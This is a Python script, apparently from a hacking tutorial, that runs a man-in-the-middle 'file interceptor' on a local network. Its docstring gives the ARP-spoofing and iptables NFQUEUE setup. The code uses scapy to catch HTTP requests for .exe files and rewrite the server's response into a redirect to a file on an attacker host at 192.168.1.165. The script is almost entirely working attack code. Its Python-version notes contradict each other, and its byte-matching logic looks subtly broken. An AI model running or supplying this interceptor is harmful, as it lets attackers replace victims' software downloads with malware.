#!/usr/bin/env python

"""
Start it with python 2 not python 3
netfilterqueue only works with Python 3 < version 3.7

File interceptor replaces file which is downloaded from UNSECURED webpages (http)

it needs in background  to start ARP spoofer and set following commands
iptables --flush
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I FORWARD -j NFQUEUE --queue-num 0
echo 1 > /proc/sys/net/ipv4/ip_forward

"""

import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 80:
            if b".exe" in scapy_packet[scapy.Raw].load.decode():
                print(" exe Request")
                ack_list.append(scapy_packet[scapy.TCP].ack)

        elif scapy_packet[scapy.TCP].sport == 80:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print(" Replacing file ")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://192.168.1.165/images/SunBeach.jpg")
                packet.set_payload(bytes(modified_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()

